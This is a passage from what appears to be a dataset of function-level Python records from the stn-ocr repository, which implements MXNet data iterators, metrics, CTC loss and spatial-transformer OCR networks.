    image = _load_image(self.lines[0].split(delimiter)[0], self.base_dir, self.resize_to, image_mode=image_mode)
    self.image_shape = image.shape
    self.image_dtype = image.dtype
    label = np.array(self.lines[0].split(delimiter)[1:], dtype=np.int32)
    self.label_shape = label.shape
    self.label_dtype = image.dtype
    self.hard_reset()
    self.workers = []
    for _ in range(self.num_workers):
        worker = Process(target=_load_worker, args=(self.task_queue, self.done_queue, self.base_dir, self.resize_to, delimiter, expected_label_length, image_mode), daemon=True)
        worker.start()
        self.workers.append(worker)"
Bartzi/stn-ocr,shutdown,"def shutdown(self):
    try:
        while True:
            self.done_queue.get_nowait()
    except Empty:
        pass
    for _ in range(2 * self.num_workers):
        self.task_queue.put(None)"
Bartzi/stn-ocr,num_data,"@property
def num_data(self):
    return len(self.lines)"
Bartzi/stn-ocr,provide_data,"@property
def provide_data(self):
    return [mx.io.DataDesc('data', (self.batch_size,) + self.image_shape, self.image_dtype)]"
Bartzi/stn-ocr,provide_label,"@property
def provide_label(self):
    return [mx.io.DataDesc(self.label_name, (self.batch_size,) + self.label_shape, self.label_dtype)]"
Bartzi/stn-ocr,hard_reset,"def hard_reset(self):
    self.cursor = 0
    self.task_queue = Queue(self.batch_size * 10)
    self.done_queue = Queue(self.batch_size * 3)
    self.overflowed = False
    self.invoke_prefetch()"
Bartzi/stn-ocr,reset,"def reset(self):
    self.cursor = self.cursor % self.num_data % self.batch_size
    self.overflowed = False"
Bartzi/stn-ocr,iter_next,"def iter_next(self):
    return self.cursor < self.num_data"
Bartzi/stn-ocr,invoke_prefetch,"def invoke_prefetch(self):
    for _ in range(self.batch_size):
        self.task_queue.put(self.lines[self.indices[self.cursor]])
        self.cursor += 1
        if self.cursor >= self.num_data:
            self.cursor = 0
            self.overflowed = True"
Bartzi/stn-ocr,next,"def next(self):
    if self.overflowed:
        raise StopIteration
    images = []
    labels = []
    while len(images) < self.batch_size and len(labels) < self.batch_size:
        (success, image, label) = self.done_queue.get()
        if not success:
            self.task_queue.put(self.lines[self.indices[self.cursor]])
            self.cursor += 1
            if self.cursor >= self.num_data:
                raise StopIteration
            continue
        images.append(image)
        labels.append(label)
    data = np.concatenate(images, axis=0)
    labels = np.concatenate(labels, axis=0)
    self.invoke_prefetch()
    return mx.io.DataBatch(data=[mx.nd.array(data)], label=[mx.nd.array(labels)], pad=[self.get_pad()], index=None)"
Bartzi/stn-ocr,getdata,"def getdata(self):
    raise NotImplementedError('Please use next nethod!')"
Bartzi/stn-ocr,getlabel,"def getlabel(self):
    raise NotImplementedError('Please use next nethod!')"
Bartzi/stn-ocr,get_pad,"def get_pad(self):
    return 0"
Bartzi/stn-ocr,provide_data,"@property
def provide_data(self):
    return [mx.io.DataDesc('data', (self.batch_size, 4) + self.image_shape[0:2] + (self.image_shape[-1] // 4,), self.image_dtype)]"
Bartzi/stn-ocr,next,"def next(self):
    if self.overflowed:
        return StopIteration
    images = []
    labels = []
    while len(images) < self.batch_size and len(labels) < self.batch_size:
        (success, image, label) = self.done_queue.get()
        if not success:
            self.task_queue.put(self.lines[self.indices[self.cursor]])
            self.cursor += 1
            if self.cursor >= self.num_data:
                return StopIteration
            continue
        image = image.reshape(1, -1, self.resize_to.height, 4, self.resize_to.width // 4)
        image = image.transpose(0, 3, 1, 2, 4)
        images.append(image)
        labels.append(label)
    data = np.concatenate(images, axis=0)
    labels = np.concatenate(labels, axis=0)
    self.invoke_prefetch()
    return mx.io.DataBatch(data=[mx.nd.array(data)], label=[mx.nd.array(labels)], pad=[self.get_pad()], index=None)"
Bartzi/stn-ocr,__getattribute__,"def __getattribute__(self, item):
    try:
        v = object.__getattribute__(self, item)
    except AttributeError:
        v = getattr(object.__getattribute__(self, 'iter'), item)
    return v"
Bartzi/stn-ocr,__init__,"def __init__(self, *args, **kwargs):
    self.iter = kwargs.pop('base_iter')
    super(DataIterDecorator, self).__init__(*args, **kwargs)"
Bartzi/stn-ocr,__iter__,"def __iter__(self):
    return self"
Bartzi/stn-ocr,__next__,"def __next__(self):
    return self.next()"
Bartzi/stn-ocr,getindex,"def getindex(self):
    return self.iter.getindex()"
Bartzi/stn-ocr,getdata,"def getdata(self):
    return self.iter.getdata()"
Bartzi/stn-ocr,getlabel,"def getlabel(self):
    return self.iter.getlabel()"
Bartzi/stn-ocr,provide_data,"@property
def provide_data(self):
    return self.iter.provide_data"
Bartzi/stn-ocr,provide_label,"@property
def provide_label(self):
    return self.iter.provide_label"
Bartzi/stn-ocr,hard_reset,"def hard_reset(self):
    return self.iter.hard_reset()"
Bartzi/stn-ocr,reset,"def reset(self):
    return self.iter.reset()"
Bartzi/stn-ocr,iter_next,"def iter_next(self):
    return self.iter.iter_next()"
Bartzi/stn-ocr,next,"def next(self):
    return self.iter.next()"
Bartzi/stn-ocr,getpad,"def getpad(self):
    return self.iter.getpad()"
Bartzi/stn-ocr,getdata,"def getdata(self):
    return [init_state[1] for init_state in self.init_states]"
Bartzi/stn-ocr,getlabel,"def getlabel(self):
    raise NotImplementedError('LSTM iter does not provide any label')"
Bartzi/stn-ocr,provide_data,"@property
def provide_data(self):
    descriptions = getattr(self.iter, 'provide_data')
    if self.init_states[0][0] in [d.name for d in descriptions]:
        return descriptions
    descriptions.extend([mx.io.DataDesc(k, v.shape, v.dtype) for (k, v) in self.init_states])
    return descriptions"
Bartzi/stn-ocr,next,"def next(self):
    if self.iter_next():
        iter_batch = self.iter.next()
        if iter_batch is StopIteration:
            raise StopIteration
        lstm_data = self.getdata()
        data = iter_batch.data
        if not isinstance(data, list):
            data = [data]
        data.extend(lstm_data)
        iter_batch.data = data
        return iter_batch
    else:
        raise StopIteration"
Bartzi/stn-ocr,__init__,"def __init__(self, *args, **kwargs):
    self.num_lstm_layers = kwargs.pop('num_lstm_layers', 1)
    self.state_size = kwargs.pop('state_size', None)
    if self.state_size is None:
        self.size_params = kwargs.pop('size_params')
    else:
        self.batch_size_multipliers = kwargs.pop('batch_size_multipliers', [])
        if len(self.batch_size_multipliers) == 0:
            self.batch_size_multipliers = [1 for _ in range(self.num_lstm_layers)]
    self.blstm = kwargs.pop('blstm', False)
    super(LSTMIter, self).__init__(*args, **kwargs)
    self.batch_size = self.iter.batch_size
    self.init_states = []
    for (layer_id, batch_size_multiplier) in zip(range(self.num_lstm_layers), self.batch_size_multipliers):
        if self.state_size is not None:
            lstm_init_shape = (self.iter.batch_size, batch_size_multiplier, self.state_size)
        else:
            lstm_init_shape = (self.iter.batch_size, batch_size_multiplier) + self.size_params[1:]
        self.init_states.append(('l{}_forward_init_c_state_cell'.format(layer_id), mx.nd.zeros(lstm_init_shape)))
        self.init_states.append(('l{}_forward_init_h_state'.format(layer_id), mx.nd.zeros(lstm_init_shape)))
        if self.blstm:
            backward_shape = lstm_init_shape
            self.init_states.append(('l{}_backward_init_c_state_cell'.format(layer_id), mx.nd.zeros(backward_shape)))
            self.init_states.append(('l{}_backward_init_h_state'.format(layer_id), mx.nd.zeros(backward_shape)))"
Bartzi/stn-ocr,__init__,"def __init__(self, *args, **kwargs):
    self.zoom = kwargs.pop('zoom', 0.9)
    super(SPNInitializer, self).__init__(*args, **kwargs)"
Bartzi/stn-ocr,_init_loc_bias,"def _init_loc_bias(self, _, arr):
    shape = arr.shape
    assert shape[0] == 6
    arr[:] = np.array([self.zoom, 0, 0, 0, self.zoom, 0])"
Bartzi/stn-ocr,load_default,"def load_default(self, name, arr):
    assert self.default_init is not None, 'Cannot Initialize %s. Not found in loaded param ' % name + 'and no default Initializer is provided.'
    self.default_init(name, arr)
    if self.verbose:
        logging.info('Initialized %s by default', name)"
Bartzi/stn-ocr,__call__,"def __call__(self, name, arr):
    if name in self.param:
        if arr.shape != self.param[name].shape:
            self.load_default(name, arr)
            return
        arr[:] = self.param[name]
        if self.verbose:
            logging.info('Initialized %s by loading', name)
    else:
        self.load_default(name, arr)"
Bartzi/stn-ocr,__init__,"def __init__(self, make_label_time_major=True):
    super(STNAccuracy, self).__init__('Accuracy')
    self.make_label_time_major = make_label_time_major"
Bartzi/stn-ocr,accuracy,"def accuracy(self, labels, preds):
    if preds.shape != labels.shape:
        preds = np.argmax(preds, axis=1)
    preds = preds.astype(np.int32)
    labels = labels.astype(np.int32)
    sum_metric = (preds.flat == labels.flat).sum()
    return (sum_metric, len(preds.flat))"
Bartzi/stn-ocr,update,"def update(self, labels, preds):
    cls_prob = preds[0].asnumpy()
    labels = labels[0].asnumpy()
    cls_labels = labels
    if len(cls_labels.shape) == 2:
        if self.make_label_time_major:
            cls_labels = np.transpose(cls_labels, axes=(1, 0))
        cls_labels = cls_labels.ravel()
    (accuracy_sum, num_instances) = self.accuracy(cls_labels, cls_prob)
    self.sum_metric += accuracy_sum
    self.num_inst += num_instances"
Bartzi/stn-ocr,__init__,"def __init__(self, eps=1e-08, make_label_time_major=True):
    super(STNCrossEntropy, self).__init__('Loss')
    self.eps = eps
    self.make_label_time_major = make_label_time_major"
Bartzi/stn-ocr,update,"def update(self, labels, preds):
    for (label, pred) in zip(labels, preds):
        label = label.asnumpy()
        pred = pred.asnumpy()
        if len(label.shape) == 2 and self.make_label_time_major:
            label = np.transpose(label, axes=(1, 0))
        label = label.ravel()
        assert label.shape[0] == pred.shape[0]
        prob = pred[np.arange(label.shape[0]), np.int64(label)]
        self.sum_metric += (-np.log(prob + self.eps)).sum()
        self.num_inst += label.shape[0]"
Bartzi/stn-ocr,remove_blank,"def remove_blank(label, blank_label=0):
    blank_indices = np.where(label == blank_label)[0]
    if len(blank_indices) == 0:
        return label
    return label[:blank_indices[0]]"
Bartzi/stn-ocr,strip_prediction,"def strip_prediction(prediction, blank_label=0):
    stripped_prediction = []
    enlarged_prediction = [blank_label] + list(prediction)
    for (char_1, char_2) in zip(enlarged_prediction, prediction):
        if char_2 == blank_label or char_2 == char_1:
            continue
        stripped_prediction.append(char_2)
    return stripped_prediction"
Bartzi/stn-ocr,__init__,"def __init__(self, label_width, num_timesteps, blank_label=0):
    self.label_width = label_width
    self.num_timesteps = num_timesteps
    self.blank_label = blank_label
    super(CTCSTNAccuracy, self).__init__()"
Bartzi/stn-ocr,accuracy,"def accuracy(self, labels, preds):
    labels = labels.reshape(self.label_width, -1)
    labels = labels.transpose(1, 0)
    (_, num_classes) = preds.shape
    preds = preds.reshape(self.num_timesteps, -1, num_classes)
    preds = np.transpose(preds, (1, 0, 2))
    data_iter = zip(np.split(labels, len(labels), axis=0), np.split(preds, len(preds), axis=0))
    hits = 0
    for (label, prediction) in data_iter:
        label = np.squeeze(label, axis=0)
        prediction = np.squeeze(prediction, axis=0)
        label = remove_blank(label, blank_label=self.blank_label)
        pred = np.argmax(prediction, axis=1)
        pred = strip_prediction(pred, blank_label=self.blank_label)
        if len(label) == len(pred):
            match = True
            for (l, p) in zip(label, pred):
                if l != p:
                    match = False
                    break
            if match:
                hits += 1
    return (hits, len(labels))"
Bartzi/stn-ocr,__init__,"def __init__(self, sequence_length, label_width, blank_label):
    super(CTCLoss, self).__init__('ctc_loss')
    self.sequence_length = sequence_length
    self.label_width = label_width
    self.loss_calculator = C_CTCLoss(sequence_length, label_width, blank_label)
    self.blank_label = blank_label"
Bartzi/stn-ocr,update,"def update(self, labels, preds):
    labels = labels[0].asnumpy().astype(np.int32)
    labels = labels.flatten()
    preds = preds[0].asnumpy().astype(np.float32)
    (_, num_classes) = preds.shape
    preds = np.ascontiguousarray(preds.reshape(self.sequence_length, -1, num_classes))
    loss = self.loss_calculator.calc_ctc_loss(labels, preds)
    if math.isnan(loss):
        logging.error(loss)
    self.sum_metric += loss
    self.num_inst += len(preds) // self.sequence_length"
Bartzi/stn-ocr,tile_batch_size,"def tile_batch_size(array, size=4):
    array = array[:, np.newaxis, ...]
    array = np.tile(array, (1, size, 1))
    array_shape = array.shape
    return array.reshape(-1, *array_shape[2:])"
Bartzi/stn-ocr,update,"def update(self, labels, preds):
    cls_prob = preds[0].asnumpy()
    labels = labels[0].asnumpy()
    labels = tile_batch_size(labels)
    (accuracy_sum, num_instances) = self.accuracy(labels, cls_prob)
    self.sum_metric += accuracy_sum
    self.num_inst += num_instances"
Bartzi/stn-ocr,__init__,"def __init__(self, eps=1e-08):
    super(FSNSPretrainCrossEntropy, self).__init__('cross-entropy')
    self.eps = eps"
Bartzi/stn-ocr,update,"def update(self, labels, preds):
    for (label, pred) in zip(labels, preds):
        label = label.asnumpy()
        pred = pred.asnumpy()
        label = tile_batch_size(label)
        label = label.ravel()
        assert label.shape[0] == pred.shape[0]
        prob = pred[np.arange(label.shape[0]), np.int64(label)]
        self.sum_metric += (-np.log(prob + self.eps)).sum()
        self.num_inst += label.shape[0]"
Bartzi/stn-ocr,softmax,"def softmax(x):
    return np.exp(x) / np.sum(np.exp(x), axis=1, keepdims=True)"
Bartzi/stn-ocr,get_network,"@staticmethod
def get_network(source_shape, target_shape, num_timesteps, num_rnn_layers, num_labels, blstm=False, fix_loc=False):
    data = mx.symbol.Variable('data')
    data = mx.symbol.Reshape(data, shape=(-3, 0, 0, 0))
    (loc, size_params) = LocalizationNetwork.get_network(data, source_shape, num_timesteps, num_rnn_layers=num_rnn_layers, blstm=blstm)
    concat_data = mx.symbol.Concat(*[data for _ in range(num_timesteps)], dim=0, name='concat_input_for_stn')
    transformed = mx.symbol.SpatialTransformer(data=concat_data, loc=loc, target_shape=(target_shape.height, target_shape.width), transform_type='affine', sampler_type='bilinear', name='stn')
    h = mx.symbol.Convolution(data=transformed, kernel=(3, 3), pad=(1, 1), num_filter=32, name='rec_conv0')
    h = mx.symbol.BatchNorm(data=h, name='rec_bn_0')
    h = mx.symbol.Activation(data=h, act_type='relu')
    pre_res_net = mx.symbol.Pooling(data=h, pool_type='avg', kernel=(2, 2), stride=(2, 2))
    h = mx.symbol.Convolution(data=pre_res_net, kernel=(3, 3), pad=(1, 1), num_filter=32, name='rec_conv1_1')
    h = mx.symbol.BatchNorm(data=h, name='rec_bn_1')
    h = mx.symbol.Activation(data=h, act_type='relu')
    h = mx.symbol.Convolution(data=h, kernel=(3, 3), pad=(1, 1), num_filter=32, name='rec_conv1_2')
    h = mx.symbol.BatchNorm(data=h, name='rec_bn_2')
    h_conv_1 = h + pre_res_net
    h = mx.symbol.Convolution(data=h_conv_1, kernel=(3, 3), pad=(1, 1), num_filter=64, name='rec_conv2_1')
    h = mx.symbol.BatchNorm(data=h, name='rec_bn_3')
    h = mx.symbol.Activation(data=h, act_type='relu')
    h = mx.symbol.Convolution(data=h, kernel=(3, 3), pad=(1, 1), num_filter=64, name='rec_conv2_2')
    h_pre_short_2 = mx.symbol.Convolution(h_conv_1, kernel=(1, 1), num_filter=64)
    h_pre_short_2 = mx.symbol.BatchNorm(data=h_pre_short_2, name='rec_bn_4')
    h_conv_2 = h + h_pre_short_2
    h_conv_2 = mx.symbol.Pooling(data=h_conv_2, pool_type='max', kernel=(2, 2), stride=(2, 2))
    h = mx.symbol.Convolution(data=h_conv_2, kernel=(3, 3), pad=(1, 1), num_filter=128, name='rec_conv3_1')
    h = mx.symbol.BatchNorm(data=h, name='rec_bn_5')
    h = mx.symbol.Activation(data=h, act_type='relu')
    h = mx.symbol.Convolution(data=h, kernel=(3, 3), pad=(1, 1), num_filter=128, name='rec_conv3_2')
    h_pre_short_3 = mx.symbol.Convolution(h_conv_2, kernel=(1, 1), num_filter=128)
    h_pre_short_3 = mx.symbol.BatchNorm(data=h_pre_short_3, name='rec_bn_7')
    h = mx.symbol.BatchNorm(data=h, name='rec_bn_6')
    h = h + h_pre_short_3
    h = mx.symbol.Pooling(h, pool_type='avg', kernel=(5, 5))
    h = mx.symbol.Reshape(data=h, shape=(-4, -1, 4, -2))
    h = mx.symbol.Reshape(data=h, shape=(0, -3, -2))
    h = mx.symbol.Flatten(data=h)
    h = mx.symbol.FullyConnected(data=h, num_hidden=256, name='rec_fn_0')
    h = mx.symbol.Activation(data=h, act_type='relu')
    classifiers = []
    for i in range(num_labels):
        softmax = mx.symbol.FullyConnected(data=h, num_hidden=134, name='rec_softmax_{}'.format(i))
        softmax = mx.symbol.Reshape(softmax, shape=(num_timesteps, -1, 134))
        softmax = mx.symbol.expand_dims(softmax, axis=1)
        classifiers.append(softmax)
    h = mx.symbol.Concat(*classifiers, dim=1, name='concat_softmax_output')
    h = mx.symbol.Reshape(h, shape=(-1, 134))
    stored_label = mx.symbol.Variable('softmax_label')
    stored_label = mx.symbol.SwapAxis(data=stored_label, dim1=1, dim2=0)
    flat_label = mx.symbol.Reshape(data=stored_label, shape=(-1,))
    loss = mx.symbol.SoftmaxOutput(data=h, label=flat_label, name='softmax')
    return (loss, loc, transformed, size_params)"
Bartzi/stn-ocr,get_network,"@staticmethod
def get_network(data, source_shape, num_timesteps, num_rnn_layers=1, blstm=False, attr={'lr_mult': '0.01'}):
    h = mx.symbol.Convolution(data=data, kernel=(3, 3), pad=(1, 1), num_filter=32, name='loc_conv0')
    h = mx.symbol.BatchNorm(data=h)
    h = mx.symbol.Activation(data=h, act_type='relu')
    pre_res_net = mx.symbol.Pooling(data=h, pool_type='avg', kernel=(2, 2), stride=(2, 2))
    h = mx.symbol.Convolution(data=pre_res_net, kernel=(3, 3), pad=(1, 1), num_filter=32, name='loc_conv1_1')
    h = mx.symbol.BatchNorm(data=h)
    h = mx.symbol.Activation(data=h, act_type='relu')
    h = mx.symbol.Convolution(data=h, kernel=(3, 3), pad=(1, 1), num_filter=32, name='loc_conv1_2')
    h = mx.symbol.BatchNorm(data=h)
    h_conv_1 = h + pre_res_net
    h_conv_1 = mx.symbol.Activation(data=h_conv_1, act_type='relu')
    h_pool = mx.symbol.Pooling(data=h_conv_1, kernel=(2, 2), stride=(2, 2), pool_type='max')
    h = mx.symbol.Convolution(data=h_pool, kernel=(3, 3), pad=(1, 1), num_filter=48, name='loc_conv2_1')
    h = mx.symbol.BatchNorm(data=h)
    h = mx.symbol.Activation(data=h, act_type='relu')
    h = mx.symbol.Convolution(data=h, kernel=(3, 3), pad=(1, 1), num_filter=48, name='loc_conv2_2')
    h_pre_short_2 = mx.symbol.Convolution(h_pool, kernel=(1, 1), num_filter=48)
    h_pre_short_2 = mx.symbol.BatchNorm(data=h_pre_short_2)
    h_conv_2 = h + h_pre_short_2
    h_conv_2 = mx.symbol.Activation(data=h_conv_2, act_type='relu')
    h_conv_2 = mx.symbol.Pooling(data=h_conv_2, kernel=(2, 2), stride=(2, 2), pool_type='max')
    h = mx.symbol.Convolution(data=h_conv_2, kernel=(3, 3), pad=(1, 1), num_filter=48, name='loc_conv3_1')
    h = mx.symbol.BatchNorm(data=h)
    h = mx.symbol.Activation(data=h, act_type='relu')
    h = mx.symbol.Convolution(data=h, kernel=(3, 3), pad=(1, 1), num_filter=48, name='loc_conv3_2')
    h = mx.symbol.BatchNorm(data=h)
    h = h + h_conv_2
    h = mx.symbol.Pooling(h, pool_type='avg', kernel=(10, 10))
    h = mx.symbol.Flatten(data=h)
    size_params = next(iter(mx.symbol_doc.SymbolDoc.get_output_shape(h, data=source_shape).values()))
    pre_concat = mx.symbol.expand_dims(h, axis=0)
    lstm_input = mx.symbol.Concat(*[pre_concat for _ in range(num_timesteps)], dim=0, name='prepare_lstm')
    for i in range(num_rnn_layers):
        rnn = lstm_unroll(lstm_input, layer_id=i, seq_len=num_timesteps, num_hidden=256, blstm=blstm)
        lstm_input = rnn
    rnn_flat = mx.symbol.Reshape(data=rnn, shape=(-3, -1))
    loc = mx.symbol.FullyConnected(data=rnn_flat, num_hidden=6, name='stn_loc', attr=attr)
    return (loc, size_params)"
Bartzi/stn-ocr,get_network,"@staticmethod
def get_network(source_shape, target_shape, num_timesteps, num_rnn_layers, num_labels, blstm=False, fix_loc=False):
    data = mx.symbol.Variable('data')
    (loc, size_params) = SVHNLocalizationNetwork.get_network(data, source_shape, num_timesteps, num_rnn_layers=num_rnn_layers, blstm=blstm)
    concat_data = mx.symbol.Concat(*[data for _ in range(num_timesteps)], dim=0, name='concat_input_for_stn')
    transformed = mx.symbol.SpatialTransformer(data=concat_data, loc=loc, target_shape=(target_shape.height, target_shape.width), transform_type='affine', sampler_type='bilinear', name='stn')
    if fix_loc:
        transformed = mx.symbol.BlockGrad(transformed)
    h = mx.symbol.Convolution(data=transformed, kernel=(3, 3), pad=(1, 1), num_filter=32, name='rec_conv0')
    h = mx.symbol.BatchNorm(data=h, name='rec_bn_0')
    h = mx.symbol.Activation(data=h, act_type='relu')
    pre_res_net = mx.symbol.Pooling(data=h, pool_type='avg', kernel=(2, 2), stride=(2, 2))
    h = mx.symbol.Convolution(data=pre_res_net, kernel=(3, 3), pad=(1, 1), num_filter=32, name='rec_conv1_1')
    h = mx.symbol.BatchNorm(data=h, name='rec_bn_1')
    h = mx.symbol.Activation(data=h, act_type='relu')
    h = mx.symbol.Convolution(data=h, kernel=(3, 3), pad=(1, 1), num_filter=32, name='rec_conv1_2')
    h = mx.symbol.BatchNorm(data=h, name='rec_bn_2')
    h_conv_1 = h + pre_res_net
    h = mx.symbol.Convolution(data=h_conv_1, kernel=(3, 3), pad=(1, 1), num_filter=48, name='rec_conv2_1')
    h = mx.symbol.BatchNorm(data=h, name='rec_bn_3')
    h = mx.symbol.Activation(data=h, act_type='relu')
    h = mx.symbol.Convolution(data=h, kernel=(3, 3), pad=(1, 1), num_filter=48, name='rec_conv2_2')
    h_pre_short_2 = mx.symbol.Convolution(h_conv_1, kernel=(1, 1), num_filter=48)
    h_pre_short_2 = mx.symbol.BatchNorm(data=h_pre_short_2, name='rec_bn_4')
    h_conv_2 = h + h_pre_short_2
    h = mx.symbol.Convolution(data=h_conv_2, kernel=(3, 3), pad=(1, 1), num_filter=48, name='rec_conv3_1')
    h = mx.symbol.BatchNorm(data=h, name='rec_bn_5')
    h = mx.symbol.Activation(data=h, act_type='relu')
    h = mx.symbol.Convolution(data=h, kernel=(3, 3), pad=(1, 1), num_filter=48, name='rec_conv3_2')
    h = mx.symbol.BatchNorm(data=h, name='rec_bn_6')
    h = h + h_conv_2
    h = mx.symbol.Pooling(h, pool_type='avg', kernel=(10, 10))
    flat_h = mx.symbol.Flatten(data=h)
    h = mx.symbol.FullyConnected(data=flat_h, num_hidden=256, name='rec_fn_0')
    h = mx.symbol.Activation(data=h, act_type='relu')
    classifiers = []
    for i in range(num_labels):
        softmax = mx.symbol.FullyConnected(data=h, num_hidden=11, name='rec_softmax_{}'.format(i))
        softmax = mx.symbol.Reshape(softmax, shape=(num_timesteps, -1, 11))
        softmax = mx.symbol.expand_dims(softmax, axis=1)
        classifiers.append(softmax)
    h = mx.symbol.Concat(*classifiers, dim=1, name='concat_softmax_output')
    h = mx.symbol.Reshape(h, shape=(-1, 11))
    stored_label = mx.symbol.Variable('softmax_label')
    label = mx.symbol.SwapAxis(data=stored_label, dim1=1, dim2=0)
    flat_label = mx.symbol.Reshape(data=label, shape=(-1,))
    lenet = mx.symbol.SoftmaxOutput(data=h, label=flat_label, name='softmax')
    return (lenet, loc, transformed, size_params)"
Bartzi/stn-ocr,get_network,"@staticmethod
def get_network(source_shape, target_shape, num_timesteps, num_rnn_layers, num_labels, blstm=False, fix_loc=False):
    data = mx.symbol.Variable('data')
    (loc, size_params) = LocalizationNetwork.get_network(data, source_shape, num_timesteps, num_rnn_layers=num_rnn_layers - 1, blstm=blstm)
    concat_data = mx.symbol.Concat(*[data for _ in range(num_timesteps)], dim=0, name='concat_input_for_stn')
    transformed = mx.symbol.SpatialTransformer(data=concat_data, loc=loc, target_shape=(target_shape.height, target_shape.width), transform_type='affine', sampler_type='bilinear', name='stn')
    if fix_loc:
        transformed = mx.symbol.BlockGrad(transformed)
    h = mx.symbol.Convolution(data=transformed, kernel=(3, 3), pad=(1, 1), num_filter=32, name='rec_conv0')
    h = mx.symbol.BatchNorm(data=h, name='rec_bn_0')
    h = mx.symbol.Activation(data=h, act_type='relu')
    pre_res_net = mx.symbol.Pooling(data=h, pool_type='avg', kernel=(2, 2), stride=(2, 2))
    h = mx.symbol.Convolution(data=pre_res_net, kernel=(3, 3), pad=(1, 1), num_filter=32, name='rec_conv1_1')
    h = mx.symbol.BatchNorm(data=h, name='rec_bn_1')
    h = mx.symbol.Activation(data=h, act_type='relu')
    h = mx.symbol.Convolution(data=h, kernel=(3, 3), pad=(1, 1), num_filter=32, name='rec_conv1_2')
    h = mx.symbol.BatchNorm(data=h, name='rec_bn_2')
    h_conv_1 = h + pre_res_net
    h = mx.symbol.Convolution(data=h_conv_1, kernel=(3, 3), pad=(1, 1), num_filter=64, name='rec_conv2_1')
    h = mx.symbol.BatchNorm(data=h, name='rec_bn_3')
    h = mx.symbol.Activation(data=h, act_type='relu')
    h = mx.symbol.Convolution(data=h, kernel=(3, 3), pad=(1, 1), num_filter=64, name='rec_conv2_2')
    h_pre_short_2 = mx.symbol.Convolution(h_conv_1, kernel=(1, 1), num_filter=64)
    h_pre_short_2 = mx.symbol.BatchNorm(data=h_pre_short_2, name='rec_bn_4')
    h_conv_2 = h + h_pre_short_2
    h_conv_2 = mx.symbol.Pooling(data=h_conv_2, pool_type='max', kernel=(2, 2), stride=(2, 2))
    h = mx.symbol.Convolution(data=h_conv_2, kernel=(3, 3), pad=(1, 1), num_filter=128, name='rec_conv3_1')
    h = mx.symbol.BatchNorm(data=h, name='rec_bn_5')
    h = mx.symbol.Activation(data=h, act_type='relu')
    h = mx.symbol.Convolution(data=h, kernel=(3, 3), pad=(1, 1), num_filter=128, name='rec_conv3_2')
    h_pre_short_3 = mx.symbol.Convolution(h_conv_2, kernel=(1, 1), num_filter=128)
    h_pre_short_3 = mx.symbol.BatchNorm(data=h_pre_short_3, name='rec_bn_7')
    h = mx.symbol.BatchNorm(data=h, name='rec_bn_6')
    h = h + h_pre_short_3
    h = mx.symbol.Pooling(h, pool_type='avg', kernel=(5, 5))
    flat_h = mx.symbol.Flatten(data=h)
    h = mx.symbol.FullyConnected(data=flat_h, num_hidden=256, name='rec_fn_0')
    h = mx.symbol.Activation(data=h, act_type='relu')
    h = mx.symbol.Reshape(h, shape=(num_timesteps, -1, 256))
    rnn = lstm_unroll(h, layer_id=num_rnn_layers - 1, seq_len=num_timesteps, num_hidden=256, blstm=blstm)
    rnn = mx.symbol.Reshape(rnn, shape=(-1, 256))
    softmax = mx.symbol.FullyConnected(data=rnn, num_hidden=11, name='rec_softmax')
    stored_label = mx.symbol.Variable('softmax_label')
    flat_label = mx.symbol.Reshape(data=stored_label, shape=(-1,))
    flat_label = mx.symbol.Cast(data=flat_label, dtype='int32')
    loss = mx.symbol.WarpCTC(data=softmax, label=flat_label, label_length=num_labels, input_length=num_timesteps)
    return (loss, loc, transformed, size_params)"
Bartzi/stn-ocr,get_network,"@staticmethod
def get_network(data, source_shape, num_timesteps, num_rnn_layers=1, blstm=False, attr={'lr_mult': '0.01'}):
    h = mx.symbol.Convolution(data=data, kernel=(3, 3), pad=(1, 1), num_filter=32, name='loc_conv0')
    h = mx.symbol.BatchNorm(data=h)
    h = mx.symbol.Activation(data=h, act_type='relu')
    pre_res_net = mx.symbol.Pooling(data=h, pool_type='avg', kernel=(2, 2), stride=(2, 2))
    h = mx.symbol.Convolution(data=pre_res_net, kernel=(3, 3), pad=(1, 1), num_filter=32, name='loc_conv1_1')
    h = mx.symbol.BatchNorm(data=h)
    h = mx.symbol.Activation(data=h, act_type='relu')
    h = mx.symbol.Convolution(data=h, kernel=(3, 3), pad=(1, 1), num_filter=32, name='loc_conv1_2')
    h = mx.symbol.BatchNorm(data=h)
    h_conv_1 = h + pre_res_net
    h_conv_1 = mx.symbol.Activation(data=h_conv_1, act_type='relu')
    h_pool = mx.symbol.Pooling(data=h_conv_1, kernel=(2, 2), stride=(2, 2), pool_type='max')
    h = mx.symbol.Convolution(data=h_pool, kernel=(3, 3), pad=(1, 1), num_filter=48, name='loc_conv2_1')
    h = mx.symbol.BatchNorm(data=h)
    h = mx.symbol.Activation(data=h, act_type='relu')
    h = mx.symbol.Convolution(data=h, kernel=(3, 3), pad=(1, 1), num_filter=48, name='loc_conv2_2')
    h_pre_short_2 = mx.symbol.Convolution(h_pool, kernel=(1, 1), num_filter=48)
    h_pre_short_2 = mx.symbol.BatchNorm(data=h_pre_short_2)
    h_conv_2 = h + h_pre_short_2
    h_conv_2 = mx.symbol.Activation(data=h_conv_2, act_type='relu')
    h_conv_2 = mx.symbol.Pooling(data=h_conv_2, kernel=(2, 2), stride=(2, 2), pool_type='max')
    h = mx.symbol.Convolution(data=h_conv_2, kernel=(3, 3), pad=(1, 1), num_filter=48, name='loc_conv3_1')
    h = mx.symbol.BatchNorm(data=h)
    h = mx.symbol.Activation(data=h, act_type='relu')
    h = mx.symbol.Convolution(data=h, kernel=(3, 3), pad=(1, 1), num_filter=48, name='loc_conv3_2')
    h = mx.symbol.BatchNorm(data=h)
    h = h + h_conv_2
    h = mx.symbol.Pooling(h, pool_type='avg', kernel=(5, 5))
    h = mx.symbol.Flatten(data=h)
    size_params = next(iter(mx.symbol_doc.SymbolDoc.get_output_shape(h, data=source_shape).values()))
    pre_concat = mx.symbol.expand_dims(h, axis=0)
    lstm_input = mx.symbol.broadcast_axis(pre_concat, axis=0, size=num_timesteps, name='prepare_lstm')
    for i in range(num_rnn_layers):
        rnn = lstm_unroll(lstm_input, layer_id=i, seq_len=num_timesteps, num_hidden=256, blstm=blstm)
        lstm_input = rnn
    rnn_flat = mx.symbol.Reshape(data=rnn, shape=(-3, -1))
    loc = mx.symbol.FullyConnected(data=rnn_flat, num_hidden=6, name='stn_loc', attr=attr)
    loc = mx.symbol.Custom(loc, op_type='DisableShearing')
    return (loc, size_params)"
Bartzi/stn-ocr,get_network,"@staticmethod
def get_network(source_shape, target_shape, num_timesteps, num_rnn_layers, num_labels, blstm=False, fix_loc=False):
    data = mx.symbol.Variable('data')
